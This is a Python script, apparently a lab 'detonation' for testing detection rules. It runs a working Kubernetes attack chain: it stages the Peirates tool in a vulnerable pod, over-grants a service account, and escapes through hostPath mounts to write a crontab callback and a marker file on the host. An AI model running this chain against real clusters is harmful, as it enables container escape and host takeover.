#!/usr/bin/env python3
"""Peirates SA pivot — workload pod → over-privileged SA → hostPath pod → host write.

See README.md for the full chain. Run:  python3 detonate.py [-w] [-s] [-n playground] [--dry-run]
"""

import json
import os
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.request
import lzma

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "scripts"))
from k8s_tool import NC, RED, Runner  # noqa: E402

MANIFEST = os.path.join(os.path.dirname(os.path.abspath(__file__)), "manifest.yaml")
TARGET_SELECTOR = "app=langflow-vulnerable"

PEIRATES_VERSION = "v1.1.34"
PEIRATES_URL = ("https://github.com/inguardians/peirates/releases/download/"
                f"{PEIRATES_VERSION}/peirates-linux-amd64.tar.xz")
PEIRATES_IN_POD = "/tmp/peirates"

# Inert netcat callback for the planted cron line (also the cleanup grep key).
CALLBACK_IP = "127.0.0.1"
CALLBACK_PORT = "4444"

MARKER_FILE = "PWNED-BY-PEIRATES"
MARKER_POD = "attack-pod-pwned"


def get_langflow_pod(r):
    pod = r.find_pod(TARGET_SELECTOR)
    if r.dry_run:
        return pod, "<node>", "<image>"
    proc = r.kubectl("get", "pod", pod, "-o", "json", capture=True)
    spec = json.loads(proc.stdout)
    return pod, spec["spec"]["nodeName"], spec["spec"]["containers"][0]["image"]


def fetch_peirates(r):
    """Download and cache the official peirates release binary."""
    cachedir = os.path.join(tempfile.gettempdir(), f"peirates-{PEIRATES_VERSION}")
    binary = os.path.join(cachedir, "peirates-linux-amd64", "peirates")
    if r.dry_run:
        return "<peirates-binary>"
    if not os.path.isfile(binary):
        os.makedirs(cachedir, exist_ok=True)
        tarball = os.path.join(cachedir, "peirates.tar.xz")
        print(f"Downloading {PEIRATES_URL} ...")
        urllib.request.urlretrieve(PEIRATES_URL, tarball)
        with tarfile.open(fileobj=lzma.open(tarball), mode="r|") as tar:
            tar.extractall(cachedir)
    return binary


def stage_binary_in_pod(r, pod, local_binary):
    """Stream the binary into the pod (binary-safe, bypasses r.run)."""
    if not r.silent:
        print(f"```\n$ kubectl -n {r.namespace} exec -i {pod} -- "
              f"sh -c 'cat > {PEIRATES_IN_POD} && chmod +x {PEIRATES_IN_POD}' < {local_binary}\n```\n")
    if r.dry_run:
        return
    with open(local_binary, "rb") as f:
        proc = subprocess.run(
            ["kubectl", "-n", r.namespace, "exec", "-i", pod, "--", "sh", "-c",
             f"cat > {PEIRATES_IN_POD} && chmod +x {PEIRATES_IN_POD}"],
            stdin=f)
    if proc.returncode != 0:
        raise RuntimeError("failed to stage the peirates binary into the pod")


def pod_exec(r, pod, shcmd, capture=True, check=True, input=None):
    cmd = ["kubectl", "-n", r.namespace, "exec"]
    if input is not None:
        cmd.append("-i")
    cmd += [pod, "--", "sh", "-c", shcmd]
    return r.run(cmd, capture=capture, check=check, input=input)


def show(proc, lines=14):
    if proc is None or not proc.stdout:
        return
    print("\n".join(proc.stdout.strip().splitlines()[:lines]), "\n")


def nodes(r):
    if r.dry_run:
        return ["<node>"]
    proc = r.run(["kubectl", "get", "nodes", "-o", "jsonpath={range .items[*]}{.metadata.name}{'\\n'}{end}"],
                 capture=True)
    return [n for n in proc.stdout.splitlines() if n]


def node_internal_ip(r, node):
    if r.dry_run:
        return "<node-ip>"
    proc = r.run(["kubectl", "get", "node", node,
                  "-o", "jsonpath={.status.addresses[?(@.type=='InternalIP')].address}"],
                 capture=True)
    return proc.stdout.strip()


def run_on_node(r, node, shcmd, timeout=180):
    """One-shot kubectl debug command on a node; returns the debug pod's logs."""
    before = {line.strip() for line in (r.kubectl("get", "pods", "-o", "name",
                capture=True, check=False).stdout or "").splitlines()
              if "node-debugger-" in line} if not r.dry_run else set()
    r.run(["kubectl", "debug", "-n", r.namespace, f"node/{node}",
           "--image=busybox:1.36", "--profile=general", "--", "sh", "-c", shcmd],
          capture=True, check=False)
    if r.dry_run:
        return None
    deadline = time.time() + timeout
    target = None
    while time.time() < deadline and target is None:
        new = {line.strip() for line in (r.kubectl("get", "pods", "-o", "name",
                   capture=True, check=False).stdout or "").splitlines()
               if "node-debugger-" in line} - before
        if new:
            target = sorted(new)[0]
        else:
            time.sleep(2)
    if target is None:
        raise RuntimeError(f"could not find the kubectl debug pod created on {node}")
    while time.time() < deadline:
        proc = r.kubectl("get", target, "-o", "jsonpath={.status.phase}",
                         capture=True, check=False)
        if proc.stdout and proc.stdout.strip() not in ("Pending", "Running"):
            break
        time.sleep(3)
    logs = r.kubectl("logs", target, capture=True, check=False).stdout
    r.kubectl("delete", target, check=False)
    return logs


def main():
    r = Runner.from_args(description=__doc__.splitlines()[0])

    r.banner("Educational Security Simulation — Peirates SA pivot → hostPath escape",
             warning="This is a SIMULATION for demonstration purposes only! "
                     "Run only on clusters you own, with permission.")

    pod, node, image = get_langflow_pod(r)
    uid = r.pod_uid(pod)
    r.join_key("compromised langflow pod UID", uid)

    r.step("Over-grant the workload SA (create pods + exec)")
    r.run(["kubectl", "apply", "-f", MANIFEST])
    r.confirm()

    r.step("Stage the peirates release binary in the compromised pod")
    binary = fetch_peirates(r)
    stage_binary_in_pod(r, pod, binary)
    r.confirm()

    r.step("Recon — peirates list-secrets (denied: no secrets permissions)")
    show(pod_exec(r, pod, f"{PEIRATES_IN_POD} -c -m list-secrets"), lines=4)
    r.confirm()

    r.step("Remote access — outbound connect to port 22 on a node")
    # Completes the lateral movement correlation legs. The peirates exec fires
    # offensive_k8s_tool (network reconnaissance) and the connect to a
    # non-loopback IP:22 fires ssh_outbound_connection (remote access). Both
    # run in the SAME kubectl exec session so they share one correlation key —
    # the groupBy the correlation rule joins on (a separate exec would get a
    # different k8s_session_* key and the legs could not group together).
    node_ip = node_internal_ip(r, node)
    pod_exec(r, pod,
             f"{PEIRATES_IN_POD} -c -m list-secrets; "
             f"python3 -c \"import socket; socket.create_connection(('{node_ip}', 22), timeout=3).close()\"")
    r.confirm()

    r.step("Escape — peirates attack-pod-hostpath-mount (host /etc/crontab write)")
    show(pod_exec(r, pod,
                  f"printf '{CALLBACK_IP}\\n{CALLBACK_PORT}\\n' | "
                  f"{PEIRATES_IN_POD} -c -m attack-pod-hostpath-mount"), lines=30)
    r.confirm()

    r.step(f"Host write — second hostPath pod creates /etc/{MARKER_FILE}")
    manifest = f"""apiVersion: v1
kind: Pod
metadata:
  name: {MARKER_POD}
  namespace: {r.namespace}
spec:
  nodeName: {node}
  # Different SA from the creator: the audit create-pods event shows the
  # workload SA (playground:default) building a pod that runs as another
  # identity (playground-sa, an existing unbound SA in the namespace).
  serviceAccountName: playground-sa
  containers:
  - name: attack-container
    image: {image}
    imagePullPolicy: IfNotPresent
    command: ["/bin/sh","-c","echo 'Host filesystem written via peirates hostPath pod' > /root/etc/{MARKER_FILE}; sleep 30"]
    volumeMounts:
    - mountPath: /root
      name: mount-fsroot
  restartPolicy: Never
  volumes:
  - name: mount-fsroot
    hostPath:
      path: /
"""
    pod_exec(r, pod, "cat > /tmp/a2.yaml", input=manifest)
    show(pod_exec(r, pod, f"{PEIRATES_IN_POD} -c -m 'kubectl apply -f /tmp/a2.yaml'"), lines=10)
    r.kubectl("wait", "--for=jsonpath={.status.phase}=Succeeded",
              f"pod/{MARKER_POD}", "--timeout=180s", check=False)
    r.confirm()

    r.step("Verify the host artifacts on every node")
    for n in nodes(r):
        logs = run_on_node(r, n,
                           f"ls /host/etc/crontab /host/etc/{MARKER_FILE} 2>/dev/null; "
                           f"tail -1 /host/etc/crontab 2>/dev/null; echo NODE-DONE")
        if logs is not None:
            print(f"  {n}:\n{logs.strip()}\n")
    r.confirm()

    r.step("Cleanup — restore node files, pods, RBAC and the staged binary")
    for n in nodes(r):
        run_on_node(r, n,
                    f"grep -q {CALLBACK_PORT} /host/etc/crontab 2>/dev/null && "
                    f"rm -f /host/etc/crontab; "
                    f"rm -f /host/etc/{MARKER_FILE}")
    r.kubectl("delete", f"pod/{MARKER_POD}", "--ignore-not-found", check=False)
    r.run(["kubectl", "delete", "-f", MANIFEST, "--ignore-not-found"])
    pod_exec(r, pod, f"rm -f {PEIRATES_IN_POD} /tmp/a2.yaml", check=False)

    r.done(f"Attack chain completed and cluster restored (join key: langflow pod UID {uid}).")


if __name__ == "__main__":
    try:
        main()
    except RuntimeError as e:
        print(f"{RED}ERROR: {e}{NC}", file=sys.stderr)
        sys.exit(1)
